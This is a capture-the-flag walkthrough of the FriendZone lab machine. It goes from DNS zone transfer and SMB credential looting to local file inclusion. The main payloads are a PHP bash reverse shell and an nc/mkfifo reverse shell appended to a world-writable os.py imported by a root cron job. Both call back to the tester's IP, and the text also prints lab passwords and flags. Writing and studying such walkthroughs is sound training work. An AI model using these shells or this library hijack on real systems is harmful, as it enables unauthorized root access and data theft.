
**IP**
```
10.10.10.123
```

### NMAP

```
nmap -Pn -sC -sV 10.10.10.123
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-21 08:56 EST
Nmap scan report for 10.10.10.123
Host is up (0.025s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -40m00s, deviation: 1h09m16s, median: -1s
| smb2-time: 
|   date: 2024-01-21T13:56:35
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2024-01-21T15:56:35+02:00
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.21 seconds
```


### HTTP

After configuring the DNS settings in /etc/hosts, nav to the page on port 80

![[Pasted image 20240121090401.png]]

Hint: Zone transfer with dig

### DIG - Zone Transfer

```
dig AXFR friendzone.red @10.10.10.123
```
```
; <<>> DiG 9.19.17-2~kali1-Kali <<>> AXFR friendzone.red @10.10.10.123
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 36 msec
;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP)
;; WHEN: Sun Jan 21 10:24:35 EST 2024
;; XFR size: 8 records (messages 1, bytes 289)

```

New domains. Put these in the /etc/hosts file:
```
hr.friendzone.red
```
```
uploads.friendzone.red
```
```
administrator1.friendzone.red
```

### SMB Shares

**smbclinet**
```
 smbclient -N -L //10.10.10.123

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Files           Disk      FriendZone Samba Server Files /etc/Files
        general         Disk      FriendZone Samba Server Files
        Development     Disk      FriendZone Samba Server Files
        IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            FRIENDZONE
```

I'll go down the list of shares and recursively look through each to see what's there via smbap. Starting with the `Files` share:

**Files**
```
smbmap -H 10.10.10.123 -r Files
```

![[Pasted image 20240121115005.png]]

**general**

![[Pasted image 20240121115438.png]]

Download the creds.txt file

==**creds.txt**==
```
smbmap -H 10.10.10.123 --download "general/creds.txt" 

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
[+] Starting download: general\creds.txt (57 bytes)             
[+] File output to: /home/dan/10.10.10.123-general_creds.txt

```

AND WE FOUND THE ADMIN CREDS!!!
```
admin
```
```
WORKWORKHhallelujah@#
```

### Logging In

Go to https://administrator1.friendzone.red and use the above credentials 

![[Pasted image 20240122150519.png]]

**dashboard.php**

![[Pasted image 20240122151011.png]]

![[Pasted image 20240122154506.png]]

Reading the message, we get the pagename `timestamp`

**timestamp**

![[Pasted image 20240122155040.png]]

### Reverse Shell

- Earlier we came across a share called `Development` that had READ/WRITE access.
- Create a reverse shell by logging in with the creds found in the `general` share

**PHP Reverse Shell**
```bash
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.46/9999 0>&1'");?>
```


**Upload the r_shell file**

```
smbclient \\\\10.10.10.123\\Development -U admin

Password for [WORKGROUP\admin]:
Try "help" to get a list of possible commands.
smb: \> put r_shell
putting file php-reverse-shell as \php-reverse-shell (1.0 kb/s) (average 1.0 kb/s)
smb: \> 
```


**Start Netcat Listener**
```
nc -nlvp 1234
```

**Execute Reverse Shell**

```
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/php-reverse-shell
```

**Shell Acquired**
```
nc -nlvp 1234

listening on [any] 1234 ...cd /
connect to [10.10.14.46] from (UNKNOWN) [10.10.10.123] 36522
Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 04:01:36 up  1:03,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

### Get User Flag

First we need to stabilize the shell

1. Escape limited shell
```
python -c 'import pty;pty.spawn("/bin/bash")'
```

2. Give access to `clear` command and more
```
export TERM=xterm
```

3. Then background the shell with CTRL+Z

4. In your terminal, use the command below.
```
stty raw -echo; fg
```

Flag is ==f61334c76f61015bf617a7410732063b==
```
www-data@FriendZone:/$ find /home/friend -name *.txt 2>/dev/null
/home/friend/user.txt
www-data@FriendZone:/$ cat /home/friend/user.txt 
f61334c76f61015bf617a7410732063b
www-data@FriendZone:/$ 

```

### User Password

I used the hint to find the password. However, you can also execute the following to find it
```
find / -name "*.conf" -exec grep -Hi pass {} \; 2>/dev/null
```

Password is located in `/var/www/mysql_data.conf`
```
db_pass=Agpyu12!0.213$
```

In that config file we'll find the database user and the db they can log into:

```
www-data@FriendZone:/$ cat /var/www/mysql_data.conf
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
www-data@FriendZone:/$ 
```

### Root Flag 

Look for files with 777 permissions

Command
```
find / -type f -perm -0777 -ls 2>/dev/null

20473     28 -rwxrwxrwx   1 root     root        25910 Jan 15  2019 /usr/lib/python2.7/os.py

```

We find a python script - os.py. This python script is owned by root but anyone can execute it. 

The os python script is a module that allows for system interaction. 

Enumerate processes and cron jobs
```
ps auxwf | grep cron

root        404  0.0  0.3  31320  3172 ?        Ss   Jan24   0:00 /usr/sbin/cron -f
friend    18204  0.0  0.1  14428  1004 pts/0    S+   02:21   0:00  | 
```

Download the `pspy64` script and put it in the Development directory

Execute it on the target machine
![[Pasted image 20240124203830.png]]

A python script `/opt/server_admin/reporter.py` is being executed by root via a cron job. It is also importing the os module we previously discovered that can be run by everyone.

Append the below reverse shell one liner to the end of the os.py file. When cron executes this file, we will gain root access. Why? Because the reporter.py script is ran with root privileges.

```
echo "system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.46 8000 >/tmp/f')" >> /usr/lib/python2.7/os.py
```


```
nc -nlvp 8000

listening on [any] 8000 ...
connect to [10.10.14.46] from (UNKNOWN) [10.10.10.123] 36112
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# ls -l
total 8
drwxr-xr-x 2 root root 4096 Sep 13  2022 certs
-rw-r----- 1 root root   33 Jan 24 02:57 root.txt
# cat root.txt
9d86a176fc4273ea6a02299398222c84
# 
```